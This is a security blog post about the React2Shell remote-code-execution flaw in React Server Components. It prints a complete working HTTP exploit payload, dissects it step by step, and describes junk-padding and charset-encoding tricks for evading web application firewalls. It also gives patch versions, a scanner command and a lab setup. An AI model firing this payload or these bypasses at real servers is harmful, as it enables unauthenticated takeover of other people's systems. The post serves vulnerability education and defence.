---
layout: post
slug: react2shell-or-prototype-pollution-going-brrr
title: react2shell or prototype pollution going brrr
tags: [rce, react, react2shell, cve, waf, bypass]
---

I guess we can call this JARP, *Just Another React2Shell Post*, because everyone has already milked this vuln that exploded like it was auditioning for Log4j's sequel. But here we are. 

Today we will unpack how this thing ticks, why it's dangerous, how to exploit it, and a few ways researchers slipped past WAF protections that were supposed to stop it.

### react2-what?

[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182), affectionately known as React2Shell, dropped in December 2025 with a flawless CVSS score of 10.0. It gives you unauthenticated RCE through a single crafted HTTP request. No session. No warm up. Just straight into the server.

Affected versions, according to the advisory, are 19.0, 19.1.0, 19.1.1 and 19.2.0. The blast radius includes:

- react-server-dom-webpack
- react-server-dom-parcel
- react-server-dom-turbopack

To know if your app is about to start singing for someone else, run:

```shell
npm ls react-server-dom-webpack \ 
       react-server-dom-parcel \ 
       react-server-dom-turbopack
```

If the versions match the cursed ones above, patch to 19.0.1, 19.1.2, 19.2.1.
 
### context

This thing hits [React Server Components (RSC)](https://react.dev/reference/rsc/server-components) Flight protocol, which is quite bad because this is not some random plugin, but it's used in millions of modern React apps and frameworks like Next.js.

RSC lets you render components on the server instead of choking the browser. The server does the heavy lifting and ships ready rendered output. The glue between the server and client is the React Flight protocol. It handles serializing and deserializing component boundaries and data.

This is a sequence diagram to illustrate the server action flow:

![server action flow](assets/img/mermaid-react2shell.png)

Here is a simplified example of how React Flight chunks look:

```js
const chunks = {
  "0": '["$1"]',
  "1": '{"thing":"vehicle","meta":"$2:brand"}',
  "2": '{"brand":"Tesla"}',
};
```

React resolves this as:

* $1 becomes chunk 1
* $2:brand pulls brand from chunk 2

Final reconstructed value:

```js
[{ thing: "vehicle", meta: "Tesla" }]
```

Server side rendering means Node figures out the HTML and ships it. Client side rendering means the browser does the heavy lifting. Server components mix the two. The server renders what it can and the browser hydrates what remains.

### smelly code

The heart of the issue is an unsafe deserialization bug in how RSC handles Flight payloads. The weak spot is inside `requireModule` in `react-server-dom-webpack`.

```js
function requireModule(metadata) {
  const moduleExports = __webpack_require__(metadata[0]);
  // ... internal logic ...
  return moduleExports[metadata[2]]; // <--- vulnerable line
}
```

The problem: bracket notation `moduleExports[metadata[2]]` traverses the prototype chain. If metadata points to a property that wasn't exported, JS *still* checks up the chain. That opens the door to the `Function` constructor: every function's `.constructor` points to it, letting you execute arbitrary strings.

React Flight's colon-separated paths let attackers deliberately walk the prototype chain. For example, `$1:constructor:constructor` is dangerous because:

* `$1` (some function) → `.constructor` = `Function`
* `Function` → `.constructor` = the `Function` constructor

Reaching the `Function` constructor lets you compile and run arbitrary strings. Note that a single `:constructor` isn't enough, it only returns `Object`'s constructor. The double reference is what unlocks the exploit.

### exploit

Here is how to exploit this vuln to execute the `id` command:

```http
POST / HTTP/1.1
Host: localhost
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 758
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

After sending it, if you see something similar to this in the response header, congrats, something *very bad* happened:

```http
X-Action-Redirect: /login?a=uid=0(root) gid=0(root) groups=0(root);push
```

### dissecting the payload

Let's analyze the exploit step by step:

1. *trigger react server action decoding*: `Next-Action` makes Next.js treat the request body as a React Server Components payload. 

    ```http
    POST / HTTP/1.1
    Next-Action: x
    Content-Type: multipart/form-data
    ```

2. *forge a resolved thenable*: React treats any object with a `then` property as a Promise. Marking it as already resolved forces immediate unwrapping during decode.

    ```json
    {
      "then": "$1:__proto__:then",
      "status": "resolved_model"
    }
    ```

3. *abuse RSC reference traversal*: `$1:__proto__:then` is an RSC pointer, not a string. It walks object 1’s prototype chain. You control where `then` comes from.

    ```json
    "then": "$1:__proto__:then"
    ```

4. *create a circular object graph*: This makes object 1 point back to object 0, giving full control over prototype and constructor traversal.

    ```http
    Content-Disposition: form-data; name="1"

    "$@0"
    ```

5. *reach `Function` via constructors*: This is the kill shot, because `obj.constructor.constructor === Function`. You replaced a harmless accessor with `Function`. Anything calling `get()` now evaluates strings as code.

    ```json
    "_formData": {
      "get": "$1:constructor:constructor"
    }
    ```

6. *execute Node.js code during RSC decode*: The RSC runtime evaluates this string through `Function`. You now have arbitrary server-side JS execution.

    ```js
    var res = process.mainModule
      .require('child_process')
      .execSync('id')
      .toString();
    ```

7. *exfiltrate output via Next.js redirect*: Next.js uses thrown errors with a `digest` field to control navigation. You leak command output in the redirect URL.

    ```js
    throw Object.assign(new Error('NEXT_REDIRECT'), {
      digest: `NEXT_REDIRECT;push;/login?a=${res};307;`
    });
    ```

8. *pad the payload to satisfy the decoder*: Padding. Keeps the RSC decoder happy. No exploit logic here.
    ```http
    Content-Disposition: form-data; name="2"

    []
    ```


---

Why this works:

* RSC deserializes object graphs, not data.
* thenables are executed during decode.
* prototype traversal is allowed.
* `constructor.constructor` is still `Function`.

Stack those and you get RCE. 💅🏻


### how to test

Please, do _\*not\*_ use some random public online tester. You have no idea if the site owner is logging the payloads to build a target list ([it happens](/dont-blindly-trust-public-exploits.html)). Or if they just vibecoded it and are leaking your data to Uranus. Test locally.

Keep calm and use nuclei:

```bash
nuclei -t cves/2025/CVE-2025-55182.yaml -t https://yourwebsite.com
```

That Assetnote template is well designed to avoid FPs.

### where to test

If you have no environment, just run a lab instance [using VulHub image](https://github.com/vulhub/vulhub/tree/master/react/CVE-2025-55182):

```shell
docker run --name web -p 3000:3000 vulhub/nextjs:15.5.6
``` 

Fire payloads at it to your heart's content.

### waf bypass

Since this blew up across half the internet, WAF vendors scrambled to patch the holes. They're a decent mitigation to block the obvious cases, but they're no silver bullet.

### the vercel beef

Shubs from Assetnote pointed out that many WAFs were still swallowing React2Shell payloads:

{% include twitter.html id="1996729020428538337" %}

Vercel CEO replied that the posted bypass only hit Cloudflare. Shubs then posted a Vercel focused bypass:

{% include twitter.html id="1997063075422429657" %}

Then, [Vercel opened a bounty program](https://hackerone.com/vercel_platform_protection) with 50K per React2Shell bypass. It burned through 750K in less than a day, jeez:

{% include twitter.html id="1998072892391592195" %}

Honestly, impressive response from Vercel. Kudos to them. And yes, this blog is hosted there. 

### some bypasses

I jumped in to see if I could bypass Vercel's WAF. Spoiler: nope. By the time I tried, the creative space had been strip mined.

I realized two strings seem heavily fingerprinted: `"_response"` and `:constructor`.

AFAIK, you cannot exploit the vuln without touching both:

- `"_response"` is the gadget you must reference.
- `:constructor` is needed to reach the Function constructor. I guess you can try `$1:__proto__:constructor`, but you still end up saying `:constructor`.

The only realistic detour is abusing encoding. If someone has a clever approach that avoids mentioning those strings, I want to hear it.

Below are some bypasses that did work for different WAFs.

#### junk bypass

You can throw a huge blob of garbage at the start of the payload. Some WAFs cap how much of the body they inspect. Less a flaw, more a *performance choice*.

See this [classic example from 2012 in Exploit-DB](https://www.exploit-db.com/exploits/18840), lol.

A [great example by @pywrd](https://x.com/pyn3rd/status/1997365282344677807) vs Akamai:

![react2shell Akamai bypass](/assets/img/r2s-akamai-bypass.png)

The Burp extension I like for this is [assetnote/nowafpls](https://github.com/assetnote/nowafpls). It includes a table of junk sizes that works like a charm.

#### encoding bypass

Another trick is playing with encoding. [@phithon_xg demoed this](https://x.com/phithon_xg/status/1997005756013728204):

![react2shell charset bypass](/assets/img/r2s-charset-bypass.png)

`form-data` fields can use charsets like `utf16le` or `ucs2`. Then you need to apend a null byte after each character. Why? Because it stores characters in pairs:

* `A` becomes `41 00`
* `B` becomes `42 00`

You can also use base64 or Unicode escaping. [Another example by @pyn3rd](https://x.com/pyn3rd/status/1996788502386909539):

![react2shell encoding bypass](/assets/img/r2s-encoding-bypass.png)

Some WAFs fail to normalize these properly.

### wrap up

React2shell is primarily a prototype pollution vulnerability, but it involves deserialization as part of the attack chain. The patch is (in most cases) trivial, the exploitation is dead simple[^1], and the blast radius was huge.

If you're running a WAF thinking it's enough, it is not.  Every month there is a new bypass and the rules gets updated. This is the cat and the mouse game that will never end. Don't get me wrong, WAFs have their place[^2], they buy you time, but they're not a substitute for patching.

Eventually, react2shell will fade. But the pattern won't. The next super-ultra-critical vuln will look different, but it'll rhyme the same way[^3]. 

Stay sharp.

<br>

[^1]: although the discovery and initial payload are super cool. I learned a lot.
[^2]: ~~sometimes~~ most of the times they are a pain in the a**
[^3]: omg, that was almost poetic, huh? 🌈